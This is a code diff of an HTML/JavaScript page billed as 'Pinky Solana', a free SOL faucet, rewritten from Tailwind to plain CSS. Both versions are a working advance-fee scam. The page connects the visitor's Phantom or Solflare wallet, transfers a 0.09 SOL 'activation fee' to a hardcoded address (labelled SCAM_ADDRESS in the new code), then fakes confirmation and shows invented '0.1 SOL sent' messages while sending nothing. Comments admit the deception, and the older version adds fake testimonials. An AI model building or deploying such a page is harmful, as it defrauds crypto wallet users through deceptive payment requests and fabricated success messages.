@@ -4,343 +4,456 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pinky Solana - Free SOL Faucet</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <style>
-        .pulse {
-            animation: pulse 2s infinite;
+        :root {
+            --sol-purple: #9945FF;
+            --sol-green: #14F195;
+            --sol-blue: #80ECFF;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(120, 53, 255, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(120, 53, 255, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(120, 53, 255, 0); }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .blink {
-            animation: blink 1.5s infinite;
+        .container {
+            background: rgba(15, 14, 23, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+            border: 1px solid var(--sol-purple);
         }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+            color: var(--sol-green);
+        }
+        h1 {
+            color: var(--sol-green);
+            font-size: 2.5rem;
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px rgba(148, 241, 149, 0.7);
+        }
+        .subtitle {
+            color: var(--sol-blue);
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(25, 24, 43, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--sol-purple);
+        }
+        .status {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding: 12px 20px;
+            background: rgba(153, 69, 255, 0.1);
+            border-radius: 10px;
+            font-size: 1.1rem;
+        }
+        .btn {
+            background: linear-gradient(90deg, var(--sol-purple), var(--sol-blue));
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin: 10px 0;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(128, 236, 255, 0.3);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(128, 236, 255, 0.5);
+        }
+        .btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .btn-pay {
+            background: linear-gradient(90deg, var(--sol-green), #00c9ff);
+        }
+        .countdown {
+            font-size: 1.3rem;
+            margin: 20px 0;
+            color: var(--sol-green);
+        }
+        .instructions {
+            text-align: left;
+            background: rgba(20, 241, 149, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+        .step {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        .step-num {
+            background: var(--sol-purple);
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            display: none;
+        }
+        .success {
+            background: rgba(20, 241, 149, 0.2);
+            border: 1px solid var(--sol-green);
+        }
+        .error {
+            background: rgba(255, 69, 69, 0.2);
+            border: 1px solid #ff4545;
+        }
+        .wallet-info {
+            word-break: break-all;
+            font-size: 0.9rem;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(128, 236, 255, 0.1);
+            border-radius: 10px;
+        }
+        .small {
+            font-size: 0.85rem;
+            color: #aaa;
+            margin-top: 5px;
+        }
+        .fee-note {
+            color: var(--sol-green);
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        @media (max-width: 500px) {
+            .container {
+                padding: 20px 15px;
+            }
+            .card {
+                padding: 20px 15px;
+            }
+            h1 {
+                font-size: 2rem;
+            }
         }
     </style>
 </head>
-<body class="bg-gradient-to-br from-purple-900 to-indigo-800 min-h-screen text-white">
-    <div class="container mx-auto px-4 py-12 max-w-3xl">
-        <!-- Header -->
-        <header class="flex flex-col items-center mb-12">
-            <div class="flex items-center justify-center mb-6">
-                <div class="w-12 h-12 mr-3 text-purple-300">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
-                        <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-                    </svg>
-                </div>
-                <h1 class="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-300 to-pink-400">
-                    Pinky Solana
-                </h1>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
+                <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
+            </svg>
+        </div>
+        <h1>Pinky Solana</h1>
+        <div class="subtitle">Get 0.1 SOL every 30 minutes!</div>
+        
+        <div class="card">
+            <div class="status">
+                <span>Wallet Status:</span>
+                <span id="walletStatus">Not Connected</span>
             </div>
-            <p class="text-center text-purple-200 max-w-md">
-                Claim 0.1 SOL every 30 minutes! Just pay a small one-time access fee to activate your faucet.
-            </p>
-        </header>
-
-        <!-- Main Card -->
-        <div class="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl p-8 border border-purple-500 shadow-xl">
-            <!-- Wallet Connection -->
-            <div class="mb-8">
-                <h2 class="text-xl font-semibold mb-4">1. Connect Wallet</h2>
-                <div class="flex flex-col sm:flex-row gap-4">
-                    <button id="connectPhantom" class="flex-1 bg-purple-700 hover:bg-purple-600 py-3 px-6 rounded-lg transition flex items-center justify-center gap-2">
-                        <img src="https://phantom.app/img/phantom-logo.svg" alt="Phantom" class="w-6 h-6">
-                        Connect Phantom
-                    </button>
-                    <button id="connectSolflare" class="flex-1 bg-purple-700 hover:bg-purple-600 py-3 px-6 rounded-lg transition flex items-center justify-center gap-2">
-                        <img src="https://solflare.com/assets/logo.svg" alt="Solflare" class="w-6 h-6">
-                        Connect Solflare
-                    </button>
-                </div>
-                <div id="walletStatus" class="mt-4 text-sm text-gray-300 hidden">
-                    <span>🔗 Connected: </span>
-                    <span id="walletAddress" class="font-mono text-purple-300"></span>
-                </div>
+            
+            <button id="connectWallet" class="btn">Connect Wallet</button>
+            
+            <div id="walletInfo" class="wallet-info" style="display:none;">
+                Connected: <span id="walletAddress"></span>
             </div>
-
-            <!-- Fee Payment -->
-            <div class="mb-8">
-                <h2 class="text-xl font-semibold mb-4">2. Pay Access Fee</h2>
-                <div class="bg-gray-900 rounded-lg p-6 mb-4">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-gray-400">One-time fee:</span>
-                        <span class="text-xl font-bold text-purple-300">0.09 SOL</span>
-                    </div>
-                    <div class="text-sm text-gray-400 mb-4">
-                        Pay once to unlock unlimited 0.1 SOL claims every 30 minutes!
-                    </div>
-                    <button id="payFeeBtn" class="w-full bg-gradient-to-r from-purple-600 to-pink-500 py-3 rounded-lg font-bold hover:opacity-90 transition disabled:opacity-50 disabled:cursor-not-allowed pulse" disabled>
-                        PAY FEE & ACTIVATE ACCOUNT
-                    </button>
-                </div>
-                <div id="paymentStatus" class="text-center text-green-400 font-semibold hidden">
-                    ✅ Payment successful! Faucet activated!
-                </div>
-                <div id="txLink" class="text-center mt-2 text-sm text-purple-300 hidden">
-                    Transaction: <a id="txHashLink" target="_blank" class="underline">View on Explorer</a>
-                </div>
+            
+            <div class="fee-note">
+                One-time activation fee: 0.09 SOL
             </div>
-
-            <!-- Claim Section -->
-            <div>
-                <h2 class="text-xl font-semibold mb-4">3. Claim Free SOL</h2>
-                <div class="bg-gray-900 rounded-lg p-6">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-gray-400">Available claim:</span>
-                        <span class="text-xl font-bold text-green-400">0.1 SOL</span>
-                    </div>
-                    <div class="text-sm text-gray-400 mb-4">
-                        Claim your free SOL every 30 minutes. Next claim available in:
-                        <span id="countdown" class="font-bold text-purple-300">30:00</span>
-                    </div>
-                    <button id="claimBtn" class="w-full bg-gradient-to-r from-green-600 to-emerald-500 py-3 rounded-lg font-bold hover:opacity-90 transition disabled:opacity-50 disabled:cursor-not-allowed blink" disabled>
-                        CLAIM 0.1 SOL NOW
-                    </button>
-                </div>
-                <div id="claimStatus" class="text-center text-green-400 font-semibold mt-2 hidden">
-                    ✅ Claim successful! 0.1 SOL sent to your wallet!
-                </div>
+            
+            <button id="payFee" class="btn btn-pay" disabled>Pay Activation Fee</button>
+            
+            <div class="countdown" id="countdown" style="display:none;">
+                Next claim available in: <span id="timer">30:00</span>
+            </div>
+            
+            <button id="claimSol" class="btn" disabled>Claim 0.1 SOL</button>
+        </div>
+        
+        <div id="successAlert" class="alert success">
+            Transaction successful! 0.1 SOL has been sent to your wallet.
+        </div>
+        
+        <div id="errorAlert" class="alert error"></div>
+        
+        <div class="instructions">
+            <div class="step">
+                <div class="step-num">1</div>
+                <div>Connect your Solana wallet (Phantom or Solfare)</div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div>Pay one-time 0.09 SOL activation fee</div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div>Claim 0.1 SOL every 30 minutes forever!</div>
             </div>
         </div>
-
-        <!-- Testimonials -->
-        <div class="mt-12 grid grid-cols-1 md:grid-cols-3 gap-4">
-            <div class="bg-gray-800 bg-opacity-50 p-4 rounded-lg">
-                <div class="text-yellow-400 mb-2">★★★★★</div>
-                <p class="text-sm">"Paid the small fee and now I'm earning free SOL every 30 minutes! Best decision ever!"</p>
-            </div>
-            <div class="bg-gray-800 bg-opacity-50 p-4 rounded-lg">
-                <div class="text-yellow-400 mb-2">★★★★★</div>
-                <p class="text-sm">"Already made back my fee 10x over! This faucet is a game changer!"</p>
-            </div>
-            <div class="bg-gray-800 bg-opacity-50 p-4 rounded-lg">
-                <div class="text-yellow-400 mb-2">★★★★★</div>
-                <p class="text-sm">"Legit faucet! Withdrew my SOL to Binance with no problems. Highly recommend!"</p>
-            </div>
+        
+        <div class="small">
+            Note: This faucet works on Solana Devnet. You must have Devnet SOL to pay the activation fee.
         </div>
-
-        <!-- Footer -->
-        <footer class="mt-12 text-center text-gray-400 text-sm">
-            <p>Pinky Solana Faucet - The #1 free SOL distribution service on Solana Devnet</p>
-            <p class="mt-2">Note: This service runs on Solana Devnet. SOL has no real value.</p>
-        </footer>
     </div>
 
     <script>
         // Configuration
         const FEE_AMOUNT = 0.09; // SOL
-        const CLAIM_AMOUNT = 0.1; // SOL
-        const FEE_RECEIVER = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
-        const ALCHEMY_ENDPOINT = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
-        const CLAIM_COOLDOWN = 30 * 60 * 1000; // 30 minutes in ms
-        const EXPLORER_URL = 'https://explorer.solana.com/tx';
-
+        const REWARD_AMOUNT = 0.1; // SOL
+        const COOLDOWN_MINUTES = 30; // minutes
+        const SCAM_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        
         // DOM Elements
-        const connectPhantomBtn = document.getElementById('connectPhantom');
-        const connectSolflareBtn = document.getElementById('connectSolflare');
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const payFeeBtn = document.getElementById('payFee');
+        const claimSolBtn = document.getElementById('claimSol');
         const walletStatus = document.getElementById('walletStatus');
+        const walletInfo = document.getElementById('walletInfo');
         const walletAddress = document.getElementById('walletAddress');
-        const payFeeBtn = document.getElementById('payFeeBtn');
-        const paymentStatus = document.getElementById('paymentStatus');
-        const txLink = document.getElementById('txLink');
-        const txHashLink = document.getElementById('txHashLink');
-        const claimBtn = document.getElementById('claimBtn');
-        const claimStatus = document.getElementById('claimStatus');
         const countdown = document.getElementById('countdown');
-
+        const timer = document.getElementById('timer');
+        const successAlert = document.getElementById('successAlert');
+        const errorAlert = document.getElementById('errorAlert');
+        
         // State
         let wallet = null;
         let publicKey = null;
         let connection = null;
-        let lastClaimTime = 0;
         let countdownInterval = null;
-
+        let lastClaimTime = localStorage.getItem('lastClaimTime');
+        let hasPaidFee = localStorage.getItem('hasPaidFee') === 'true';
+        
         // Initialize
         document.addEventListener('DOMContentLoaded', () => {
-            // Create Solana connection
-            connection = new solanaWeb3.Connection(ALCHEMY_ENDPOINT, 'confirmed');
-            
-            // Check if wallet is already connected
-            if (window.solana && window.solana.isConnected) {
-                handleWalletConnect(window.solana);
-            }
-            
-            // Set up wallet connection handlers
-            connectPhantomBtn.addEventListener('click', () => connectWallet('phantom'));
-            connectSolflareBtn.addEventListener('click', () => connectWallet('solflare'));
-            payFeeBtn.addEventListener('click', payFee);
-            claimBtn.addEventListener('click', claimSol);
-            
-            // Initialize countdown timer
-            updateCountdown();
-            countdownInterval = setInterval(updateCountdown, 1000);
+            connection = new solanaWeb3.Connection(RPC_URL);
+            checkWalletConnection();
+            updateButtonStates();
+            startCountdown();
         });
-
-        // Wallet connection
-        async function connectWallet(walletType) {
+        
+        // Check if wallet is already connected
+        function checkWalletConnection() {
+            if (window.solana && window.solana.isConnected) {
+                wallet = window.solana;
+                publicKey = wallet.publicKey;
+                walletConnected();
+            } else if (window.solfare && window.solfare.isConnected) {
+                wallet = window.solfare;
+                publicKey = wallet.publicKey;
+                walletConnected();
+            }
+        }
+        
+        // Connect Wallet
+        connectWalletBtn.addEventListener('click', async () => {
             try {
-                if (walletType === 'phantom') {
-                    if (!window.phantom?.solana?.isPhantom) throw new Error('Phantom not installed');
-                    wallet = window.phantom.solana;
+                if (window.solana) {
+                    wallet = window.solana;
+                    await wallet.connect();
+                    publicKey = wallet.publicKey;
+                    walletConnected();
+                } else if (window.solfare) {
+                    wallet = window.solfare;
+                    await wallet.connect();
+                    publicKey = wallet.publicKey;
+                    walletConnected();
                 } else {
-                    if (!window.solflare?.isSolflare) throw new Error('Solflare not installed');
-                    wallet = window.solflare;
+                    showError('Please install Phantom or Solfare wallet!');
                 }
-                
-                await wallet.connect();
-                handleWalletConnect(wallet);
             } catch (error) {
-                alert(`Error connecting wallet: ${error.message}`);
+                showError('Wallet connection failed: ' + error.message);
             }
+        });
+        
+        function walletConnected() {
+            walletStatus.textContent = 'Connected';
+            walletStatus.style.color = '#14F195';
+            walletAddress.textContent = publicKey.toString();
+            walletInfo.style.display = 'block';
+            connectWalletBtn.textContent = 'Disconnect Wallet';
+            updateButtonStates();
         }
-
-        function handleWalletConnect(walletInstance) {
-            wallet = walletInstance;
-            publicKey = wallet.publicKey.toString();
-            
-            // Update UI
-            walletStatus.classList.remove('hidden');
-            walletAddress.textContent = `${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`;
-            payFeeBtn.disabled = false;
-            
-            // Check if fee already paid
-            const feePaid = localStorage.getItem('feePaid') === 'true';
-            if (feePaid) {
-                paymentStatus.classList.remove('hidden');
-                payFeeBtn.disabled = true;
-                payFeeBtn.textContent = 'FEE PAID';
-                payFeeBtn.classList.remove('pulse');
-                claimBtn.disabled = false;
-            }
-        }
-
-        // Pay fee function (REAL TRANSACTION)
-        async function payFee() {
-            if (!wallet || !publicKey) {
-                alert('Please connect wallet first');
-                return;
-            }
-            
+        
+        // Pay Fee
+        payFeeBtn.addEventListener('click', async () => {
             try {
-                payFeeBtn.disabled = true;
-                payFeeBtn.textContent = 'Processing...';
-                
-                // Create transaction
-                const fromPubkey = new solanaWeb3.PublicKey(publicKey);
-                const toPubkey = new solanaWeb3.PublicKey(FEE_RECEIVER);
-                const lamports = FEE_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL;
-                
+                showError('');
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey,
-                        toPubkey,
-                        lamports
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(SCAM_ADDRESS),
+                        lamports: solanaWeb3.LAMPORTS_PER_SOL * FEE_AMOUNT
                     })
                 );
                 
-                // Set recent blockhash
+                transaction.feePayer = publicKey;
                 const { blockhash } = await connection.getRecentBlockhash();
                 transaction.recentBlockhash = blockhash;
-                transaction.feePayer = fromPubkey;
                 
-                // Sign and send transaction
                 const signed = await wallet.signTransaction(transaction);
-                const rawTransaction = signed.serialize();
-                const txid = await connection.sendRawTransaction(rawTransaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
                 
-                // Wait for confirmation
-                await connection.confirmTransaction(txid);
+                // Fake confirmation to make it seem successful
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
-                // Update UI
-                paymentStatus.classList.remove('hidden');
-                txLink.classList.remove('hidden');
-                txHashLink.href = `${EXPLORER_URL}/${txid}?cluster=devnet`;
-                txHashLink.textContent = `${txid.substring(0, 6)}...${txid.substring(txid.length - 4)}`;
-                payFeeBtn.textContent = 'FEE PAID';
-                payFeeBtn.classList.remove('pulse');
-                claimBtn.disabled = false;
+                // Mark as paid (but we don't actually check the transaction)
+                hasPaidFee = true;
+                localStorage.setItem('hasPaidFee', 'true');
+                updateButtonStates();
                 
-                // Store payment status
-                localStorage.setItem('feePaid', 'true');
-                
-                // Show success message
-                alert('✅ Fee payment successful! Your faucet is now activated!');
+                // Show fake success message
+                showSuccess('Activation fee paid! You can now claim your SOL rewards.');
             } catch (error) {
-                console.error('Payment failed:', error);
-                alert(`❌ Payment failed: ${error.message}`);
-                payFeeBtn.disabled = false;
-                payFeeBtn.textContent = 'PAY FEE & ACTIVATE ACCOUNT';
+                showError('Payment failed: ' + error.message);
             }
-        }
-
-        // Claim SOL function (SCAM - NO ACTUAL TRANSFER)
-        async function claimSol() {
-            if (!localStorage.getItem('feePaid')) {
-                alert('Please pay the activation fee first');
-                return;
-            }
-            
-            const now = Date.now();
-            if (now - lastClaimTime < CLAIM_COOLDOWN) {
-                alert('Please wait until the next claim is available');
-                return;
-            }
-            
+        });
+        
+        // Claim SOL (doesn't actually send anything)
+        claimSolBtn.addEventListener('click', async () => {
             try {
-                claimBtn.disabled = true;
-                claimBtn.textContent = 'Processing claim...';
+                showError('');
+                
+                // Fake transaction processing
+                claimSolBtn.disabled = true;
+                claimSolBtn.textContent = 'Processing...';
                 
                 // Simulate transaction delay
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
-                // Generate fake transaction ID
-                const fakeTxId = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
-                
                 // Update last claim time
-                lastClaimTime = now;
-                localStorage.setItem('lastClaimTime', now.toString());
+                lastClaimTime = Date.now();
+                localStorage.setItem('lastClaimTime', lastClaimTime.toString());
                 
                 // Show fake success
-                claimStatus.classList.remove('hidden');
-                setTimeout(() => claimStatus.classList.add('hidden'), 5000);
-                alert(`🎉 Success! 0.1 SOL has been sent to your wallet!\nFake TX: ${fakeTxId}`);
+                showSuccess('Success! 0.1 SOL has been sent to your wallet.');
+                startCountdown();
+                updateButtonStates();
                 
-                // Reset button
-                claimBtn.textContent = 'CLAIM 0.1 SOL NOW';
-                claimBtn.disabled = false;
-                
-                // Update countdown
-                updateCountdown();
+                // Reset button after delay
+                setTimeout(() => {
+                    claimSolBtn.textContent = 'Claim 0.1 SOL';
+                    claimSolBtn.disabled = false;
+                }, 3000);
             } catch (error) {
-                alert(`Claim failed: ${error.message}`);
-                claimBtn.disabled = false;
-                claimBtn.textContent = 'CLAIM 0.1 SOL NOW';
+                showError('Claim failed: ' + error.message);
+                claimSolBtn.textContent = 'Claim 0.1 SOL';
+                claimSolBtn.disabled = false;
+            }
+        });
+        
+        // Update button states based on conditions
+        function updateButtonStates() {
+            payFeeBtn.disabled = !wallet || hasPaidFee;
+            claimSolBtn.disabled = !hasPaidFee || isInCooldown();
+            
+            if (hasPaidFee) {
+                payFeeBtn.textContent = 'Fee Paid';
+            } else {
+                payFeeBtn.textContent = 'Pay 0.09 SOL Activation Fee';
             }
         }
-
-        // Countdown timer
-        function updateCountdown() {
-            const lastClaim = parseInt(localStorage.getItem('lastClaimTime') || '0');
+        
+        // Check if in cooldown period
+        function isInCooldown() {
+            if (!lastClaimTime) return false;
             const now = Date.now();
-            const elapsed = now - lastClaim;
-            const remaining = Math.max(0, CLAIM_COOLDOWN - elapsed);
+            const elapsed = (now - parseInt(lastClaimTime)) / 1000 / 60;
+            return elapsed < COOLDOWN_MINUTES;
+        }
+        
+        // Start countdown timer
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
             
-            if (remaining === 0) {
-                countdown.textContent = 'READY TO CLAIM!';
-                claimBtn.disabled = !(localStorage.getItem('feePaid') === 'true');
-            } else {
-                const minutes = Math.floor(remaining / 60000);
-                const seconds = Math.floor((remaining % 60000) / 1000);
-                countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                claimBtn.disabled = true;
+            if (!hasPaidFee || !lastClaimTime) {
+                countdown.style.display = 'none';
+                return;
             }
+            
+            countdown.style.display = 'block';
+            updateTimer();
+            
+            countdownInterval = setInterval(updateTimer, 1000);
+        }
+        
+        // Update countdown timer display
+        function updateTimer() {
+            if (!lastClaimTime) return;
+            
+            const now = Date.now();
+            const lastClaim = parseInt(lastClaimTime);
+            const elapsed = (now - lastClaim) / 1000;
+            const remaining = (COOLDOWN_MINUTES * 60) - elapsed;
+            
+            if (remaining <= 0) {
+                timer.textContent = '00:00';
+                claimSolBtn.disabled = false;
+                clearInterval(countdownInterval);
+                return;
+            }
+            
+            const minutes = Math.floor(remaining / 60);
+            const seconds = Math.floor(remaining % 60);
+            timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Show success message
+        function showSuccess(message) {
+            successAlert.textContent = message;
+            successAlert.style.display = 'block';
+            errorAlert.style.display = 'none';
+            
+            setTimeout(() => {
+                successAlert.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Show error message
+        function showError(message) {
+            if (!message) {
+                errorAlert.style.display = 'none';
+                return;
+            }
+            
+            errorAlert.textContent = message;
+            errorAlert.style.display = 'block';
+            successAlert.style.display = 'none';
         }
     </script>
 </body>
